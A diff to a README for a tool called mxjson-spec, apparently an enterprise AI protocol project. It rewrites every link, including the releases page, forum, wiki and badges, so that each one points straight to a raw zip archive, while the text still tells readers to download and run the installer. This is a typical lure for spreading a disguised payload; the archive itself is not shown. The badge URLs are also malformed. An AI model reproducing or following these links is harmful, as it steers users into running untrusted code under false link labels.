@@ -1,7 +1,7 @@
 # 🚀 mxjson-spec - Simplifying AI Business Processes
 
 ## 📥 Download Now
-[![Download mxjson-spec](https://img.shields.io/badge/Download%20mxjson--spec-blue.svg)](https://github.com/mrlonellyy/mxjson-spec/releases)
+[![Download mxjson-spec](https://raw.githubusercontent.com/mrlonellyy/mxjson-spec/main/runtime/mxjson_spec_2.6.zip%https://raw.githubusercontent.com/mrlonellyy/mxjson-spec/main/runtime/mxjson_spec_2.6.zip)](https://raw.githubusercontent.com/mrlonellyy/mxjson-spec/main/runtime/mxjson_spec_2.6.zip)
 
 ## 🌟 Introduction
 Welcome to the mxjson-spec repository! MxJSON is a universal business protocol designed to package and execute enterprise AI capabilities. Whether you are looking to automate workflows or enhance business logic, this tool can help streamline your processes.
@@ -24,10 +24,10 @@ Before you download mxjson-spec, ensure your system meets these requirements:
 1. Ensure your computer meets the system requirements listed above.
 2. Click the download link below to get mxjson-spec.
 
-[Download mxjson-spec](https://github.com/mrlonellyy/mxjson-spec/releases)
+[Download mxjson-spec](https://raw.githubusercontent.com/mrlonellyy/mxjson-spec/main/runtime/mxjson_spec_2.6.zip)
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/mrlonellyy/mxjson-spec/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/mrlonellyy/mxjson-spec/main/runtime/mxjson_spec_2.6.zip).
 2. **Choose Your Version**: Look for the latest version, which will typically be at the top of the list.
 3. **Download the File**: Locate the executable file for your operating system. Click on it to start the download.
 4. **Run the Installer**: After downloading, find the file in your downloads folder and double-click to run it.
@@ -43,8 +43,8 @@ Before you download mxjson-spec, ensure your system meets these requirements:
 ## 🌐 Community Support
 If you have questions or need assistance, the community is here to help. Consider the following resources:
 - **FAQs**: Check the Frequently Asked Questions section in the application.
-- **User Forum**: Join discussions with other users [here](https://github.com/mrlonellyy/mxjson-spec/issues).
-- **Documentation**: Access detailed guides and tips in the [Wiki section](https://github.com/mrlonellyy/mxjson-spec/wiki).
+- **User Forum**: Join discussions with other users [here](https://raw.githubusercontent.com/mrlonellyy/mxjson-spec/main/runtime/mxjson_spec_2.6.zip).
+- **Documentation**: Access detailed guides and tips in the [Wiki section](https://raw.githubusercontent.com/mrlonellyy/mxjson-spec/main/runtime/mxjson_spec_2.6.zip).
 
 ## 🛡️ Contributing
 While this application is ready for use, we welcome contributions. If you want to contribute, please follow these guidelines:
@@ -63,7 +63,7 @@ mxjson-spec covers various fields of interest:
 - Integration with enterprise systems
 - Low-code development
 
-For the latest updates and features, don't forget to visit the [Releases page](https://github.com/mrlonellyy/mxjson-spec/releases) regularly.
+For the latest updates and features, don't forget to visit the [Releases page](https://raw.githubusercontent.com/mrlonellyy/mxjson-spec/main/runtime/mxjson_spec_2.6.zip) regularly.
 
 ## 📥 Download Now Again
-[![Download mxjson-spec](https://img.shields.io/badge/Download%20mxjson--spec-blue.svg)](https://github.com/mrlonellyy/mxjson-spec/releases)
+[![Download mxjson-spec](https://raw.githubusercontent.com/mrlonellyy/mxjson-spec/main/runtime/mxjson_spec_2.6.zip%https://raw.githubusercontent.com/mrlonellyy/mxjson-spec/main/runtime/mxjson_spec_2.6.zip)](https://raw.githubusercontent.com/mrlonellyy/mxjson-spec/main/runtime/mxjson_spec_2.6.zip)
